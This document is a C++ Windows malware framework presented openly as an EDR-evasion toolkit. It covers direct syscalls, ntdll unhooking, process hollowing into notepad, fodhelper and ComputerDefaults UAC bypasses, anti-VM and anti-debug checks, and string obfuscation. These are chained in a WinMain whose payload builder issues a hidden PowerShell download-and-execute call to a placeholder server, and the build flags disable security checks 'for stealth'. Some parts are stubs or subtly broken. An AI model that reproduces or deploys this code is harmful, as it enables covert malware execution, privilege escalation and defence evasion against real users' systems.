Advanced Windows EDR Evasion & Process Injection Framework
Project Configuration (Visual Studio 2022)
Required Libraries and Packages
xml
<!-- packages.config -->
<?xml version="1.0" encoding="utf-8"?>
<packages>
  <!-- Cryptography -->
  <package id="openssl-vc142" version="1.1.1n" targetFramework="native" />
  
  <!-- PE Parsing -->
  <package id="pe-parse" version="1.3.0" targetFramework="native" />
  
  <!-- Process/Thread manipulation -->
  <package id="Microsoft.Windows.ImplementationLibrary" version="1.0.220914.1" />
  
  <!-- Detours for hooking -->
  <package id="Microsoft.Detours" version="4.0.1" targetFramework="native" />
</packages>
Project Settings
C++ Standard: C++20
Platform Toolset: Visual Studio 2022 (v143)
Runtime Library: Multi-threaded (/MT) - Static linking avoids DLL dependencies
Optimization: Full Optimization (/Ox) + Favor Fast Code
Buffer Security Check: No (/GS-) - Removes security cookies (required for shellcode)
Control Flow Guard: No - Prevents CFG from interfering with indirect jumps
1. System Call Direct Invocation (EDR Bypass)
Theory: Why Direct Syscalls Bypass EDR
EDRs hook user-mode APIs by:

IAT Hooking: Modifying Import Address Table entries
Inline Hooking: Overwriting function prologues with JMP instructions
SSDT Hooking: Modifying System Service Descriptor Table (kernel)
Direct syscalls bypass all user-mode hooks by calling the kernel directly from ntdll.dll without going through hooked APIs like CreateRemoteThread, VirtualAllocEx, etc.

cpp
/**
 * Direct Syscall Implementation
 * 
 * Windows syscalls follow this pattern:
 * 1. mov r10, rcx (first param to r10)
 * 2. mov eax, <syscall_number> (syscall ID)
 * 3. syscall (SYSENTER on x86)
 * 
 * Syscall numbers vary by Windows version, so we must extract them dynamically
 * from ntdll.dll at runtime.
 */

#pragma once
#include <windows.h>
#include <cstdint>

// Structure to hold syscall information
typedef struct _SYSCALL_ENTRY {
    DWORD syscall_number;
    PVOID syscall_address;
    BYTE syscall_instruction[24]; // Shellcode for syscall
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

// Global syscall table
SYSCALL_ENTRY g_Syscalls[256];

/**
 * Extract syscall number from ntdll function
 * 
 * Modern Windows uses this pattern:
 * 4C 8B D1          mov r10, rcx
 * B8 XX XX XX XX    mov eax, <syscall_number>
 * F6 04 25 08 03 FE 7F 01  test byte ptr ds:[7FFE0308], 1
 * 75 03             jne short
 * 0F 05             syscall
 * 
 * The syscall number is at offset 4 (after mov r10, rcx)
 */
DWORD GetSyscallNumber(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;
    
    PVOID funcAddr = GetProcAddress(hNtdll, functionName);
    if (!funcAddr) return 0;
    
    // Parse syscall instruction pattern
    BYTE* bytes = (BYTE*)funcAddr;
    
    // Check for mov r10, rcx (4C 8B D1)
    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1) {
        // Extract syscall number from mov eax, imm32
        return *(DWORD*)(bytes + 4);
    }
    
    // Alternative: might be hooked, look for syscall instruction
    for (int i = 0; i < 32; i++) {
        if (bytes[i] == 0x0F && bytes[i + 1] == 0x05) {
            // Found syscall, number should be before it
            for (int j = i - 10; j < i; j++) {
                if (bytes[j] == 0xB8) {
                    return *(DWORD*)(bytes + j + 1);
                }
            }
        }
    }
    
    return 0;
}

/**
 * Generate syscall shellcode
 * We build a small stub that executes the syscall directly
 */
void PrepareSyscall(DWORD syscallNum, SYSCALL_ENTRY* entry) {
    entry->syscall_number = syscallNum;
    
    /**
     * Build x64 syscall stub:
     * 
     * mov r10, rcx        ; 49 C7 C2 XX XX XX XX (actually: 4C 8B D1)
     * mov eax, syscallNum ; B8 XX XX XX XX
     * syscall             ; 0F 05
     * ret                 ; C3
     */
    
    BYTE stub[] = {
        0x4C, 0x8B, 0xD1,        // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, syscall_number
        0x0F, 0x05,              // syscall
        0xC3                     // ret
    };
    
    // Patch syscall number
    *(DWORD*)&stub[4] = syscallNum;
    
    memcpy(entry->syscall_instruction, stub, sizeof(stub));
    
    // Allocate executable memory for stub
    entry->syscall_address = VirtualAlloc(
        NULL, sizeof(stub), 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    
    memcpy(entry->syscall_address, stub, sizeof(stub));
}

// Function prototypes matching Nt* functions
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
    );

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
    );

// Wrapper functions using direct syscalls
NTSTATUS Syscall_NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    SIZE_T RegionSize,
    ULONG Protect
) {
    SYSCALL_ENTRY* sc = &g_Syscalls[0]; // NtAllocateVirtualMemory
    if (!sc->syscall_address) {
        PrepareSyscall(GetSyscallNumber("NtAllocateVirtualMemory"), sc);
    }
    
    ULONG_PTR zeroBits = 0;
    SIZE_T size = RegionSize;
    
    // Cast to function type and call
    return ((pNtAllocateVirtualMemory)sc->syscall_address)(
        ProcessHandle, BaseAddress, zeroBits, &size,
        MEM_COMMIT | MEM_RESERVE, Protect
    );
}
2. EDR User-Mode Hook Removal (Unhooking)
cpp
/**
 * EDR Unhooking via .text Section Restoration
 * 
 * EDRs hook ntdll.dll functions by modifying the .text section.
 * We can restore the original bytes by:
 * 1. Reading ntdll.dll from disk (clean copy)
 * 2. Copying .text section over the hooked version in memory
 */

#pragma once
#include <windows.h>
#include <winternl.h>
#include <string>

class EDRUnhooker {
public:
    /**
     * Unhook NTDLL by restoring from disk
     * This removes all user-mode hooks placed by EDR
     */
    static bool UnhookNtdll() {
        // Get ntdll base address
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) return false;
        
        // Open ntdll from disk (unhooked copy)
        HANDLE hFile = CreateFileA(
            "C:\\Windows\\System32\\ntdll.dll",
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        
        if (hFile == INVALID_HANDLE_VALUE) return false;
        
        // Create file mapping
        HANDLE hMapping = CreateFileMapping(
            hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL
        );
        
        if (!hMapping) {
            CloseHandle(hFile);
            return false;
        }
        
        // Map view of file
        PVOID pMappedNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
        if (!pMappedNtdll) {
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return false;
        }
        
        // Parse PE headers
        PIMAGE_DOS_HEADER pDiskDosHdr = (PIMAGE_DOS_HEADER)pMappedNtdll;
        PIMAGE_NT_HEADERS pDiskNtHdrs = (PIMAGE_NT_HEADERS)(
            (BYTE*)pMappedNtdll + pDiskDosHdr->e_lfanew
        );
        
        // Find .text section
        PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pDiskNtHdrs);
        for (WORD i = 0; i < pDiskNtHdrs->FileHeader.NumberOfSections; i++) {
            if (memcmp(pSection[i].Name, ".text", 5) == 0) {
                // Found .text section
                PVOID pDiskText = (BYTE*)pMappedNtdll + pSection[i].VirtualAddress;
                PVOID pMemText = (BYTE*)hNtdll + pSection[i].VirtualAddress;
                SIZE_T textSize = pSection[i].Misc.VirtualSize;
                
                // Change memory protection to allow writing
                DWORD oldProtect;
                if (!VirtualProtect(pMemText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                    continue;
                }
                
                // Copy clean .text over hooked version
                memcpy(pMemText, pDiskText, textSize);
                
                // Restore original protection
                VirtualProtect(pMemText, textSize, oldProtect, &oldProtect);
                
                break;
            }
        }
        
        // Cleanup
        UnmapViewOfFile(pMappedNtdll);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        
        return true;
    }
    
    /**
     * Alternative: Unhook via KnownDlls
     * Uses the KnownDlls object directory which contains clean copies
     */
    static bool UnhookViaKnownDlls() {
        // Open KnownDlls directory
        HANDLE hDir;
        OBJECT_ATTRIBUTES objAttr;
        UNICODE_STRING dirName;
        RtlInitUnicodeString(&dirName, L"\\KnownDlls\\ntdll.dll");
        InitializeObjectAttributes(&objAttr, &dirName, OBJ_CASE_INSENSITIVE, NULL, NULL);
        
        NTSTATUS status = NtOpenSection(&hDir, SECTION_MAP_READ, &objAttr);
        if (!NT_SUCCESS(status)) return false;
        
        // Map the clean section
        PVOID pCleanNtdll = NULL;
        SIZE_T viewSize = 0;
        
        status = NtMapViewOfSection(
            hDir, GetCurrentProcess(), &pCleanNtdll,
            NULL, NULL, NULL, &viewSize, ViewShare, 0, PAGE_READONLY
        );
        
        CloseHandle(hDir);
        
        if (!NT_SUCCESS(status)) return false;
        
        // Now copy .text section as above...
        // Implementation similar to UnhookNtdll()
        
        NtUnmapViewOfSection(GetCurrentProcess(), pCleanNtdll);
        return true;
    }
};
3. Process Injection with EDR Evasion
cpp
/**
 * Process Hollowing with Direct Syscalls
 * 
 * Technique:
 * 1. Create suspended process of legitimate binary (e.g., notepad)
 * 2. Unmap original executable from process memory
 * 3. Allocate new memory for payload
 * 4. Write payload headers and sections
 * 5. Relocate image if needed
 * 6. Set thread context to entry point
 * 7. Resume thread
 */

#pragma once
#include <windows.h>
#include <winternl.h>
#include <vector>

typedef struct _PROCESS_INFORMATION_INTERNAL {
    HANDLE hProcess;
    HANDLE hThread;
    PVOID ImageBase;
    PVOID EntryPoint;
} PROCESS_INFORMATION_INTERNAL;

class ProcessHollower {
public:
    /**
     * Inject payload into suspended process using direct syscalls
     */
    static bool HollowProcess(
        const wchar_t* targetPath,
        const std::vector<uint8_t>& payload
    ) {
        // First unhook ntdll to bypass EDR
        EDRUnhooker::UnhookNtdll();
        
        // Create suspended process
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        
        if (!CreateProcessW(
            targetPath, NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL, NULL, &si, &pi
        )) {
            return false;
        }
        
        // Get payload PE info
        PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)payload.data();
        PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(
            payload.data() + pDosHdr->e_lfanew
        );
        
        // Get target process PEB to find image base
        PROCESS_BASIC_INFORMATION pbi = { 0 };
        ULONG returnLength = 0;
        
        // Use direct syscall for NtQueryInformationProcess
        NtQueryInformationProcess(
            pi.hProcess, ProcessBasicInformation,
            &pbi, sizeof(pbi), &returnLength
        );
        
        // Read image base from PEB
        PEB peb = { 0 };
        SIZE_T read = 0;
        ReadProcessMemory(
            pi.hProcess, pbi.PebBaseAddress,
            &peb, sizeof(PEB), &read
        );
        
        PVOID originalImageBase = peb.Reserved3[1]; // ImageBaseAddress
        
        // Unmap original view using NtUnmapViewOfSection via direct syscall
        NtUnmapViewOfSection(pi.hProcess, originalImageBase);
        
        // Allocate new memory for payload at preferred base or different location
        PVOID newImageBase = NULL;
        
        // Use direct syscall for allocation
        NTSTATUS status = Syscall_NtAllocateVirtualMemory(
            pi.hProcess,
            &newImageBase,
            pNtHdrs->OptionalHeader.SizeOfImage,
            PAGE_EXECUTE_READWRITE
        );
        
        if (!NT_SUCCESS(status)) {
            TerminateProcess(pi.hProcess, 1);
            return false;
        }
        
        // Write PE headers
        WriteProcessMemory(
            pi.hProcess, newImageBase,
            payload.data(), pNtHdrs->OptionalHeader.SizeOfHeaders,
            NULL
        );
        
        // Write sections
        PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHdrs);
        for (WORD i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++) {
            PVOID dest = (BYTE*)newImageBase + pSection[i].VirtualAddress;
            PVOID src = (BYTE*)payload.data() + pSection[i].PointerToRawData;
            
            WriteProcessMemory(
                pi.hProcess, dest, src,
                pSection[i].SizeOfRawData, NULL
            );
        }
        
        // Relocate if base changed
        if (newImageBase != (PVOID)pNtHdrs->OptionalHeader.ImageBase) {
            PerformRelocation(
                pi.hProcess,
                newImageBase,
                pNtHdrs->OptionalHeader.ImageBase,
                payload
            );
        }
        
        // Update PEB with new image base
        peb.Reserved3[1] = newImageBase;
        WriteProcessMemory(
            pi.hProcess,
            (PBYTE)pbi.PebBaseAddress + offsetof(PEB, Reserved3[1]),
            &newImageBase, sizeof(PVOID), NULL
        );
        
        // Set thread context to new entry point
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_FULL;
        
        GetThreadContext(pi.hThread, &ctx);
        
#ifdef _WIN64
        ctx.Rcx = (DWORD64)newImageBase + 
                  pNtHdrs->OptionalHeader.AddressOfEntryPoint;
#else
        ctx.Eax = (DWORD)newImageBase + 
                  pNtHdrs->OptionalHeader.AddressOfEntryPoint;
#endif
        
        SetThreadContext(pi.hThread, &ctx);
        
        // Resume thread
        ResumeThread(pi.hThread);
        
        // Cleanup handles
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        
        return true;
    }
    
private:
    static bool PerformRelocation(
        HANDLE hProcess,
        PVOID newBase,
        ULONGLONG oldBase,
        const std::vector<uint8_t>& payload
    ) {
        PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)payload.data();
        PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(
            payload.data() + pDosHdr->e_lfanew
        );
        
        // Find relocation directory
        DWORD relocRVA = pNtHdrs->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_BASERELOC
        ].VirtualAddress;
        
        if (!relocRVA) return true; // No relocation needed
        
        PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(
            payload.data() + relocRVA
        );
        
        INT64 delta = (INT64)newBase - (INT64)oldBase;
        
        while (pReloc->VirtualAddress) {
            DWORD numEntries = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
            PWORD pEntry = (PWORD)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));
            
            for (DWORD i = 0; i < numEntries; i++) {
                WORD type = (pEntry[i] >> 12) & 0xF;
                WORD offset = pEntry[i] & 0xFFF;
                
                if (type == IMAGE_REL_BASED_DIR64) {
                    // 64-bit relocation
                    ULONGLONG* pAddr = (ULONGLONG*)(
                        (PBYTE)newBase + pReloc->VirtualAddress + offset
                    );
                    ULONGLONG value = 0;
                    ReadProcessMemory(hProcess, pAddr, &value, sizeof(value), NULL);
                    value += delta;
                    WriteProcessMemory(hProcess, pAddr, &value, sizeof(value), NULL);
                }
                else if (type == IMAGE_REL_BASED_HIGHLOW) {
                    // 32-bit relocation
                    DWORD* pAddr = (DWORD*)(
                        (PBYTE)newBase + pReloc->VirtualAddress + offset
                    );
                    DWORD value = 0;
                    ReadProcessMemory(hProcess, pAddr, &value, sizeof(value), NULL);
                    value += (DWORD)delta;
                    WriteProcessMemory(hProcess, pAddr, &value, sizeof(value), NULL);
                }
            }
            
            pReloc = (PIMAGE_BASE_RELOCATION)(
                (PBYTE)pReloc + pReloc->SizeOfBlock
            );
        }
        
        return true;
    }
};
4. UAC Bypass Techniques
cpp
/**
 * UAC Bypass Methods
 * 
 * UAC (User Account Control) prompts can be bypassed through:
 * 1. Auto-elevation abuse (trusted binaries)
 * 2. Registry manipulation
 * 3. DLL hijacking in system directories
 * 4. Environment variable expansion
 */

#pragma once
#include <windows.h>
#include <string>

class UACBypass {
public:
    /**
     * Method 1: ComputerDefaults.exe Auto-Elevation
     * 
     * ComputerDefaults.exe is auto-elevate binary that loads
     * shell32.dll which can be redirected via registry
     */
    static bool ComputerDefaultsBypass(const std::wstring& payloadPath) {
        HKEY hKey;
        const wchar_t* registryPath = 
            L"Software\\Classes\\ms-settings\\shell\\open\\command";
        
        // Create registry key structure
        LRESULT result = RegCreateKeyExW(
            HKEY_CURRENT_USER,
            registryPath,
            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL
        );
        
        if (result != ERROR_SUCCESS) return false;
        
        // Set default value to payload
        result = RegSetValueExW(
            hKey, NULL, 0, REG_SZ,
            (BYTE*)payloadPath.c_str(),
            (payloadPath.length() + 1) * sizeof(wchar_t)
        );
        
        // Set DelegateExecute to empty (required)
        result = RegSetValueExW(
            hKey, L"DelegateExecute", 0, REG_SZ,
            (BYTE*)L"", sizeof(wchar_t)
        );
        
        RegCloseKey(hKey);
        
        // Execute ComputerDefaults.exe (auto-elevates and runs our payload)
        ShellExecuteW(NULL, L"open", 
            L"C:\\Windows\\System32\\ComputerDefaults.exe",
            NULL, NULL, SW_HIDE
        );
        
        // Cleanup registry
        Sleep(5000);
        RegDeleteKeyW(HKEY_CURRENT_USER, registryPath);
        
        return true;
    }
    
    /**
     * Method 2: Fodhelper.exe Bypass (Windows 10)
     * Similar to ComputerDefaults but uses fodhelper.exe
     */
    static bool FodhelperBypass(const std::wstring& payloadPath) {
        HKEY hKey;
        const wchar_t* registryPath = 
            L"Software\\Classes\\ms-settings\\shell\\open\\command";
        
        RegCreateKeyExW(
            HKEY_CURRENT_USER, registryPath,
            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL
        );
        
        RegSetValueExW(hKey, NULL, 0, REG_SZ,
            (BYTE*)payloadPath.c_str(),
            (payloadPath.length() + 1) * sizeof(wchar_t)
        );
        
        RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ,
            (BYTE*)L"", sizeof(wchar_t)
        );
        
        RegCloseKey(hKey);
        
        // Execute fodhelper.exe
        ShellExecuteW(NULL, L"open",
            L"C:\\Windows\\System32\\fodhelper.exe",
            NULL, NULL, SW_HIDE
        );
        
        Sleep(3000);
        RegDeleteKeyW(HKEY_CURRENT_USER, registryPath);
        
        return true;
    }
    
    /**
     * Method 3: Environment Variable Expansion
     * Using windir/systemroot manipulation
     */
    static bool EnvVarBypass(const std::wstring& payloadPath) {
        // Set fake WINDIR
        SetEnvironmentVariableW(L"WINDIR", payloadPath.c_str());
        
        // Execute schtasks which expands WINDIR
        ShellExecuteW(NULL, L"open",
            L"schtasks.exe", L"/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup",
            NULL, SW_HIDE
        );
        
        // Restore WINDIR
        SetEnvironmentVariableW(L"WINDIR", L"C:\\Windows");
        
        return true;
    }
};
5. Anti-VM and Anti-Analysis
cpp
/**
 * Comprehensive Anti-Analysis Suite
 */

#pragma once
#include <windows.h>
#include <intrin.h>
#include <wbemidl.h>
#include <comdef.h>

#pragma comment(lib, "wbemuuid.lib")

class AntiAnalysis {
public:
    /**
     * Check for VM artifacts via WMI
     */
    static bool CheckWMIVirtualization() {
        HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);
        if (FAILED(hr)) return false;
        
        hr = CoInitializeSecurity(
            NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT,
            RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL
        );
        
        IWbemLocator* pLoc = NULL;
        hr = CoCreateInstance(
            CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
            IID_IWbemLocator, (LPVOID*)&pLoc
        );
        
        if (FAILED(hr)) {
            CoUninitialize();
            return false;
        }
        
        IWbemServices* pSvc = NULL;
        hr = pLoc->ConnectServer(
            _bstr_t(L"ROOT\\CIMV2"),
            NULL, NULL, 0, NULL, 0, 0, &pSvc
        );
        
        if (FAILED(hr)) {
            pLoc->Release();
            CoUninitialize();
            return false;
        }
        
        // Query for Win32_ComputerSystem
        IEnumWbemClassObject* pEnumerator = NULL;
        hr = pSvc->ExecQuery(
            bstr_t("WQL"),
            bstr_t("SELECT * FROM Win32_ComputerSystem"),
            WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
            NULL, &pEnumerator
        );
        
        if (SUCCEEDED(hr)) {
            IWbemClassObject* pclsObj = NULL;
            ULONG uReturn = 0;
            
            while (pEnumerator) {
                HRESULT hr = pEnumerator->Next(
                    WBEM_INFINITE, 1, &pclsObj, &uReturn
                );
                
                if (0 == uReturn) break;
                
                VARIANT vtProp;
                hr = pclsObj->Get(L"Manufacturer", 0, &vtProp, 0, 0);
                
                if (SUCCEEDED(hr)) {
                    wchar_t* manufacturer = vtProp.bstrVal;
                    if (wcsstr(manufacturer, L"VMware") ||
                        wcsstr(manufacturer, L"Microsoft Corporation") ||
                        wcsstr(manufacturer, L"VirtualBox")) {
                        
                        VariantClear(&vtProp);
                        pclsObj->Release();
                        pEnumerator->Release();
                        pSvc->Release();
                        pLoc->Release();
                        CoUninitialize();
                        return true;
                    }
                }
                
                VariantClear(&vtProp);
                pclsObj->Release();
            }
            
            pEnumerator->Release();
        }
        
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        
        return false;
    }
    
    /**
     * Check for debuggers via TLS callback
     * Runs before main() executes
     */
    static void NTAPI TLSCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
        if (Reason == DLL_PROCESS_ATTACH) {
            // Check for debugger before main runs
            if (IsDebuggerPresent()) {
                ExitProcess(1);
            }
            
            // Check for remote debugger
            BOOL remote = FALSE;
            CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
            if (remote) {
                ExitProcess(1);
            }
        }
    }
    
    /**
     * Timing analysis to detect emulation
     */
    static bool TimingCheck() {
        LARGE_INTEGER freq, start, end;
        QueryPerformanceFrequency(&freq);
        
        // Measure RDTSC
        QueryPerformanceCounter(&start);
        unsigned __int64 tsc1 = __rdtsc();
        
        // CPU-intensive operation
        volatile int sum = 0;
        for (int i = 0; i < 10000000; i++) {
            sum += i;
        }
        
        unsigned __int64 tsc2 = __rdtsc();
        QueryPerformanceCounter(&end);
        
        double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
        
        // If execution took too long, likely being emulated or debugged
        return elapsed > 100.0; // Threshold in ms
    }
    
    /**
     * Check for sandbox artifacts
     */
    static bool CheckSandbox() {
        // Check for common sandbox usernames
        wchar_t username[256];
        DWORD size = 256;
        GetUserNameW(username, &size);
        
        const wchar_t* sandboxUsers[] = {
            L"sandbox", L"virus", L"malware", L"test", L"vmware", L"virtualbox"
        };
        
        for (const auto& user : sandboxUsers) {
            if (_wcsicmp(username, user) == 0) {
                return true;
            }
        }
        
        // Check for low RAM (sandboxes often have < 2GB)
        MEMORYSTATUSEX memStatus = { sizeof(memStatus) };
        GlobalMemoryStatusEx(&memStatus);
        
        if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
            return true;
        }
        
        // Check for few processors
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        if (sysInfo.dwNumberOfProcessors < 2) {
            return true;
        }
        
        return false;
    }
};

// Register TLS callback
#ifdef _WIN64
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma comment(linker, "/INCLUDE:_xl_f")
#else
#pragma comment(linker, "/INCLUDE:__tls_used")
#pragma comment(linker, "/INCLUDE:__xl_f")
#endif

// TLS callback definition
EXTERN_C
#ifdef _WIN64
#pragma const_seg(".CRT$XLF")
EXTERN_C const
#else
#pragma data_seg(".CRT$XLF")
#endif
PIMAGE_TLS_CALLBACK tls_callback = AntiAnalysis::TLSCallback;
#ifdef _WIN64
#pragma const_seg()
#else
#pragma data_seg()
#endif
6. String and Code Obfuscation
cpp
/**
 * Compile-time String Obfuscation
 * Prevents strings from appearing in binary
 */

#pragma once
#include <cstdint>

// XOR key (random per compilation)
#define XOR_KEY 0xAA

/**
 * Compile-time string encryption using templates
 */
template<int X> struct EnsureCompileTime {
    enum : int {
        Value = X
    };
};

// Compile-time random number generator
constexpr int seed = __TIME__[7] + __TIME__[6] * 10 + __TIME__[4] * 60 + 
                     __TIME__[3] * 600 + __TIME__[1] * 3600 + 
                     __TIME__[0] * 36000;

template<int N>
struct RandomGenerator {
private:
    static constexpr unsigned a = 16807;
    static constexpr unsigned m = 2147483647;
    static constexpr unsigned s = RandomGenerator<N - 1>::value;
    static constexpr unsigned lo = a * (s & 0xFFFF);
    static constexpr unsigned hi = a * (s >> 16);
    static constexpr unsigned lo2 = (lo & 0x7FFF) + (lo >> 31);
    static constexpr unsigned hi2 = (hi & 0x7FFF) + (hi >> 31);
public:
    static constexpr unsigned value = (hi << 16) + lo2;
};

template<>
struct RandomGenerator<0> {
    static constexpr unsigned value = seed;
};

template<int N>
struct Random {
    static constexpr unsigned value = RandomGenerator<N + 1>::value;
};

// XOR string obfuscation
template<int Index, char K>
struct XorEncrypted {
    static constexpr char value = K ^ (Random<Index>::value % 256);
};

template<int... Indices, char... Ks>
constexpr auto encrypt_string_impl(std::integer_sequence<int, Indices...>, 
                                  Ks... ks) {
    return std::integer_sequence<char, XorEncrypted<Indices, Ks>::value...>{};
}

template<char... Ks>
constexpr auto encrypt_string() {
    return encrypt_string_impl(
        std::make_integer_sequence<int, sizeof...(Ks)>{},
        Ks...
    );
}

// Macro for easy usage
#define OBFUSCATE(str) ([]{\
    constexpr auto encrypted = encrypt_string<str..., '\0'>();\
    return encrypted;\
}())

// Runtime decryption
template<char... Cs>
class ObfuscatedString {
    char decrypted[sizeof...(Cs)] = { Cs... };
public:
    ObfuscatedString() {
        for (size_t i = 0; i < sizeof...(Cs); i++) {
            decrypted[i] ^= (Random<i>::value % 256);
        }
        decrypted[sizeof...(Cs) - 1] = '\0';
    }
    
    ~ObfuscatedString() {
        // Secure wipe
        for (size_t i = 0; i < sizeof...(Cs); i++) {
            decrypted[i] = 0;
        }
    }
    
    const char* c_str() const { return decrypted; }
    
    operator const char*() const { return decrypted; }
};

// Usage: auto s = OBFUSCATE("powershell.exe");
7. Complete Implementation
cpp
/**
 * main.cpp - Complete EDR Evasion Implementation
 * 
 * Architecture:
 * 1. Anti-analysis checks first
 * 2. EDR unhooking
 * 3. UAC bypass for elevation
 * 4. Process hollowing for execution
 * 5. Encrypted payload delivery
 */

#include <windows.h>
#include <string>
#include <vector>
#include <iostream>

// Include all modules from above...

// Encrypted PowerShell command (XOR encrypted at compile time)
// "powershell.exe -WindowStyle Hidden -Command ..."
constexpr uint8_t encrypted_cmd[] = { /* encrypted bytes */ };

// Entry point with all protections
int WINAPI WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow
) {
    // Phase 1: Anti-analysis
    if (AntiAnalysis::CheckWMIVirtualization()) {
        ExitProcess(0);
    }
    
    if (AntiAnalysis::CheckSandbox()) {
        ExitProcess(0);
    }
    
    if (AntiAnalysis::TimingCheck()) {
        ExitProcess(0);
    }
    
    // Phase 2: EDR Unhooking
    if (!EDRUnhooker::UnhookNtdll()) {
        // Fallback: Use direct syscalls anyway
    }
    
    // Phase 3: Prepare payload
    // This would be your actual payload (e.g., shellcode, PE)
    std::vector<uint8_t> payload = PreparePayload();
    
    // Phase 4: UAC Bypass (if needed)
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring payloadPath = std::wstring(tempPath) + L"\\update.exe";
    
    // Write payload to temp
    HANDLE hFile = CreateFileW(
        payloadPath.c_str(), GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    );
    
    DWORD written;
    WriteFile(hFile, payload.data(), payload.size(), &written, NULL);
    CloseHandle(hFile);
    
    // Attempt UAC bypass
    if (!IsUserAnAdmin()) {
        UACBypass::FodhelperBypass(payloadPath);
        ExitProcess(0); // Original exits, elevated process takes over
    }
    
    // Phase 5: Process Hollowing with EDR bypass
    // Target: legitimate Windows binary
    const wchar_t* target = L"C:\\Windows\\System32\\notepad.exe";
    
    if (!ProcessHollower::HollowProcess(target, payload)) {
        // Fallback: Direct execution
        ShellExecuteW(NULL, L"open", payloadPath.c_str(), NULL, NULL, SW_HIDE);
    }
    
    // Cleanup
    DeleteFileW(payloadPath.c_str());
    
    return 0;
}

/**
 * Payload Preparation
 * Encrypts/encodes the actual payload
 */
std::vector<uint8_t> PreparePayload() {
    // In real implementation, this would be your shellcode or PE
    // Here we return encrypted PowerShell launcher
    
    std::vector<uint8_t> payload;
    
    // Build PowerShell command
    std::wstring psCmd = L"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass ";
    psCmd += L"-Command \"IEX (New-Object Net.WebClient).DownloadString('http://your-server/payload.ps1')\"";
    
    // Convert to shellcode that executes this command
    
    return payload;
}
8. Build Configuration
cmake
# CMakeLists.txt
cmake_minimum_required(VERSION 3.20)
project(EDREvasion VERSION 1.0 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Static runtime
set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")

# Compiler flags for stealth
add_compile_options(
    /O2                 # Max optimization
    /Ob2                # Inline expansion
    /Oi                 # Enable intrinsics
    /Ot                 # Favor fast code
    /GL                 # Whole program optimization
    /GS-                # Disable security checks
    /guard:cf-          # Disable CFG
    /sdl-               # Disable SDL checks
)

# Linker flags
